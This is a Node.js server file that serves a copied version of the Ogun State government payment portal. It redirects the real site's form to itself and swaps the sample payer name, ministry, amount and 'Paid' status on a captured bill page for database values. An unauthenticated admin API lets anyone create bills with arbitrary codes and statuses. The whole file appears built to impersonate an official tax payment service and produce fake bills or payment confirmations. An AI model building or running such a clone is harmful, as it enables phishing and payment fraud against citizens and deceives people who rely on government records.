const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const url = require('url');
const querystring = require('querystring');
const db = require('./db.js');

const HTTP_PORT = process.env.HTTP_PORT || 3000;
const HTTPS_PORT = process.env.HTTPS_PORT || 3443;
const BASE_DIR = __dirname;

// SSL Certificate Paths
const certDir = path.join(BASE_DIR, 'certs');
const defaultKeyPath = path.join(certDir, 'key.pem');
const defaultCertPath = path.join(certDir, 'cert.pem');

const sslKeyPath = process.env.SSL_KEY_PATH || (fs.existsSync(defaultKeyPath) ? defaultKeyPath : null);
const sslCertPath = process.env.SSL_CERT_PATH || (fs.existsSync(defaultCertPath) ? defaultCertPath : null);
const isHttpsConfigured = !!(sslKeyPath && sslCertPath);

// MIME types
const MIME_TYPES = {
  '.html': 'text/html; charset=UTF-8',
  '.css': 'text/css; charset=UTF-8',
  '.js': 'application/javascript; charset=UTF-8',
  '.json': 'application/json; charset=UTF-8',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.gif': 'image/gif',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon',
  '.woff': 'font/woff',
  '.woff2': 'font/woff2',
  '.ttf': 'font/ttf'
};

function sendJSON(res, statusCode, data) {
  res.writeHead(statusCode, {
    'Content-Type': 'application/json; charset=UTF-8',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type, Authorization'
  });
  res.end(JSON.stringify(data));
}

function parseRequestBody(req) {
  return new Promise((resolve, reject) => {
    let body = '';
    req.on('data', chunk => {
      body += chunk.toString();
      if (body.length > 2e6) reject(new Error('Body too large'));
    });
    req.on('end', () => {
      const contentType = req.headers['content-type'] || '';
      if (contentType.includes('application/json')) {
        try { resolve(body ? JSON.parse(body) : {}); } catch (e) { reject(e); }
      } else {
        resolve(querystring.parse(body));
      }
    });
    req.on('error', reject);
  });
}

function serveStaticFile(res, filePath) {
  fs.readFile(filePath, (err, content) => {
    if (err) {
      if (err.code === 'ENOENT') {
        res.writeHead(404, { 'Content-Type': 'text/html; charset=UTF-8' });
        res.end('<h1>404 Not Found</h1>');
      } else {
        res.writeHead(500, { 'Content-Type': 'text/plain; charset=UTF-8' });
        res.end('500 Server Error: ' + err.message);
      }
      return;
    }
    const ext = path.extname(filePath).toLowerCase();
    const contentType = MIME_TYPES[ext] || 'application/octet-stream';
    res.writeHead(200, { 'Content-Type': contentType, 'Access-Control-Allow-Origin': '*' });
    res.end(content);
  });
}

// Server-side dynamic renderer for pay.html / validate-payment-code.html
function serveValidationPage(res, queryCode) {
  const filePath = fs.existsSync(path.join(BASE_DIR, 'pay.html')) ? path.join(BASE_DIR, 'pay.html') : path.join(BASE_DIR, 'validate-payment-code.html');
  fs.readFile(filePath, 'utf8', (err, html) => {
    if (err) {
      res.writeHead(500, { 'Content-Type': 'text/plain' });
      return res.end('Server error loading page');
    }

    if (!queryCode) {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=UTF-8' });
      return res.end(html);
    }

    const bill = db.getBillByCode(queryCode);
    if (!bill) {
      res.writeHead(302, { Location: `/?error=not_found&code=${encodeURIComponent(queryCode)}` });
      return res.end();
    }

    const formattedAmount = parseFloat(bill.amount || 0).toLocaleString('en-NG', {
      minimumFractionDigits: 2,
      maximumFractionDigits: 2
    });

    const isPaid = (bill.status || '').toLowerCase() === 'paid';
    const statusClass = isPaid ? 'text-success' : 'text-warning';

    let rendered = html
      .replace(/#0094000056959/g, '#' + bill.payment_code.replace(/^#+/, ''))
      .replace(/MINIMUM TAX/g, bill.bill_description)
      .replace(/MR ADEYEMI\s+ADEMOLA/g, bill.billed_to)
      .replace(/Internal Revenue Service IRS/g, bill.ministry)
      .replace(/Miniumum Tax/g, bill.service || bill.bill_description)
      .replace(/7th April, 2026/g, bill.bill_date)
      .replace(/#13388027/g, '#' + (bill.bill_number ? bill.bill_number.replace(/^#+/, '') : ''))
      .replace(/10,100\.00/g, formattedAmount)
      .replace(/<td class="\s*text-success\s*text-right">\s*Paid\s*<\/td>/i,
        `<td class=" ${statusClass} text-right">${bill.status}</td>`);

    res.writeHead(200, { 'Content-Type': 'text/html; charset=UTF-8' });
    res.end(rendered);
  });
}

// Server-side renderer for home page
function serveHomePage(res, query) {
  const filePath = fs.existsSync(path.join(BASE_DIR, 'index.html')) ? path.join(BASE_DIR, 'index.html') : path.join(BASE_DIR, 'pay_ogunstate_gov_ng.html');
  fs.readFile(filePath, 'utf8', (err, html) => {
    if (err) {
      res.writeHead(500, { 'Content-Type': 'text/plain' });
      return res.end('Server error loading page');
    }

    let rendered = html.replace(
      'action="https://pay.ogunstate.gov.ng/validate-payment-code"',
      'action="/validate-payment-code"'
    );

    if (query && query.error === 'not_found') {
      const code = query.code ? query.code.replace(/[^a-zA-Z0-9]/g, '') : '';
      const alertSnippet = `
        <div class="alert alert-danger text-center mx-auto" style="max-width: 600px; margin-top: 15px;">
          <strong>Payment Code Not Found:</strong> No billing record matches code <code>#${code}</code> in the database. Please verify and try again.
        </div>
      `;
      rendered = rendered.replace(
        '<div class="flash-message text-center">',
        '<div class="flash-message text-center">' + alertSnippet
      );
    }

    res.writeHead(200, { 'Content-Type': 'text/html; charset=UTF-8' });
    res.end(rendered);
  });
}

// Core Request Handler (used by both HTTPS and HTTP)
async function handleAppRequest(req, res) {
  // Add Security Headers (HSTS & MIME protection)
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');

  if (req.method === 'OPTIONS') {
    res.writeHead(204, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, Authorization'
    });
    return res.end();
  }

  const parsedUrl = url.parse(req.url, true);
  const pathname = parsedUrl.pathname;
  const method = req.method.toUpperCase();

  // --- API ROUTES ---
  if (pathname === '/api/stats' && method === 'GET') {
    return sendJSON(res, 200, { success: true, stats: db.getStats() });
  }

  if (pathname === '/api/bills' && method === 'GET') {
    return sendJSON(res, 200, { success: true, bills: db.getAllBills() });
  }

  const billCodeMatch = pathname.match(/^\/api\/bills\/([^/]+)$/);
  if (billCodeMatch && method === 'GET') {
    const code = decodeURIComponent(billCodeMatch[1]);
    const bill = db.getBillByCode(code);
    if (!bill) {
      return sendJSON(res, 404, { success: false, message: `No bill found for code: ${code}` });
    }
    return sendJSON(res, 200, { success: true, bill });
  }

  if (pathname === '/api/bills' && method === 'POST') {
    try {
      const data = await parseRequestBody(req);
      if (!data.billed_to || !data.payment_code || data.amount === undefined) {
        return sendJSON(res, 400, { success: false, message: 'Missing required fields' });
      }
      const existing = db.getBillByCode(data.payment_code);
      if (existing) {
        return sendJSON(res, 409, { success: false, message: `Payment code #${db.normalizeCode(data.payment_code)} already exists.` });
      }
      const newBill = db.createBill(data);
      return sendJSON(res, 201, { success: true, bill: newBill });
    } catch (e) {
      return sendJSON(res, 500, { success: false, error: e.message });
    }
  }

  const billIdMatch = pathname.match(/^\/api\/bills\/id\/(\d+)$/) || pathname.match(/^\/api\/bills\/(\d+)$/);
  if (billIdMatch && method === 'PUT') {
    try {
      const id = billIdMatch[1];
      const data = await parseRequestBody(req);
      const updated = db.updateBill(id, data);
      if (!updated) return sendJSON(res, 404, { success: false, message: 'Bill not found' });
      return sendJSON(res, 200, { success: true, bill: updated });
    } catch (e) {
      return sendJSON(res, 500, { success: false, error: e.message });
    }
  }

  if (billIdMatch && method === 'DELETE') {
    try {
      const id = billIdMatch[1];
      db.deleteBill(id);
      return sendJSON(res, 200, { success: true, message: 'Deleted' });
    } catch (e) {
      return sendJSON(res, 500, { success: false, error: e.message });
    }
  }

  // Handle Home Form POST
  if (pathname === '/validate-payment-code' && method === 'POST') {
    try {
      const data = await parseRequestBody(req);
      const code = data.payment_code ? data.payment_code.toString().trim() : '';
      if (!code) {
        res.writeHead(302, { Location: '/?error=not_found' });
        return res.end();
      }

      const cleanCode = db.normalizeCode(code);
      const bill = db.getBillByCode(cleanCode);

      if (bill) {
        const targetPage = fs.existsSync(path.join(BASE_DIR, 'pay.html')) ? 'pay.html' : 'validate-payment-code.html';
        res.writeHead(302, { Location: `/${targetPage}?code=${encodeURIComponent(cleanCode)}` });
        return res.end();
      } else {
        res.writeHead(302, { Location: `/?error=not_found&code=${encodeURIComponent(cleanCode)}` });
        return res.end();
      }
    } catch (e) {
      res.writeHead(302, { Location: '/?error=server_error' });
      return res.end();
    }
  }

  // --- PAGE SERVING ---
  if (pathname === '/' || pathname === '/home' || pathname === '/index.html' || pathname === '/pay_ogunstate_gov_ng.html') {
    return serveHomePage(res, parsedUrl.query);
  }

  if (pathname === '/pay' || pathname === '/pay.html' || pathname === '/validate-payment-code' || pathname === '/validate-payment-code.html') {
    return serveValidationPage(res, parsedUrl.query.code);
  }

  if (pathname === '/admin' || pathname === '/admin.html') {
    return serveStaticFile(res, path.join(BASE_DIR, 'admin.html'));
  }

  // Static Assets
  const safePath = path.normalize(pathname).replace(/^(\.\.[/\\])+/, '');
  const inBaseDir = path.join(BASE_DIR, safePath);
  if (fs.existsSync(inBaseDir) && fs.statSync(inBaseDir).isFile()) {
    return serveStaticFile(res, inBaseDir);
  }

  const inRoot = path.join(__dirname, safePath);
  if (fs.existsSync(inRoot) && fs.statSync(inRoot).isFile()) {
    return serveStaticFile(res, inRoot);
  }

  return serveStaticFile(res, inBaseDir); // 404
}

// ==========================================
// START SERVERS (HTTPS & HTTP AUTO-REDIRECT)
// ==========================================

if (isHttpsConfigured) {
  const sslOptions = {
    key: fs.readFileSync(sslKeyPath),
    cert: fs.readFileSync(sslCertPath)
  };

  // 1. Secure HTTPS Server
  const httpsServer = https.createServer(sslOptions, handleAppRequest);
  httpsServer.listen(HTTPS_PORT, () => {
    console.log(`=======================================================`);
    console.log(` [SECURE] BPMS HTTPS Server is RUNNING on port ${HTTPS_PORT}`);
    console.log(` - Secure Portal URL: https://localhost:${HTTPS_PORT}`);
    console.log(` - Secure Admin URL:  https://localhost:${HTTPS_PORT}/admin`);
    console.log(`=======================================================`);
  });

  // 2. HTTP Server with Automatic Redirect to HTTPS
  const httpServer = http.createServer((req, res) => {
    const host = (req.headers.host || '').replace(/:\d+$/, '');
    const redirectPort = HTTPS_PORT === 443 ? '' : `:${HTTPS_PORT}`;
    const secureUrl = `https://${host}${redirectPort}${req.url}`;
    res.writeHead(301, { Location: secureUrl });
    res.end(`Redirecting to secure connection: ${secureUrl}`);
  });

  httpServer.listen(HTTP_PORT, () => {
    console.log(` [HTTP REDIRECT] Port ${HTTP_PORT} listening and redirecting all traffic to HTTPS (${HTTPS_PORT})`);
  });
} else {
  // If no SSL certs found, fallback to standard HTTP with reverse-proxy HTTPS check
  const httpServer = http.createServer((req, res) => {
    // Cloudflare / Nginx / Render HTTPS forward check
    if (req.headers['x-forwarded-proto'] === 'http') {
      const secureUrl = `https://${req.headers.host}${req.url}`;
      res.writeHead(301, { Location: secureUrl });
      return res.end();
    }
    handleAppRequest(req, res);
  });

  httpServer.listen(HTTP_PORT, () => {
    console.log(`BPMS Server running on http://localhost:${HTTP_PORT}`);
  });
}
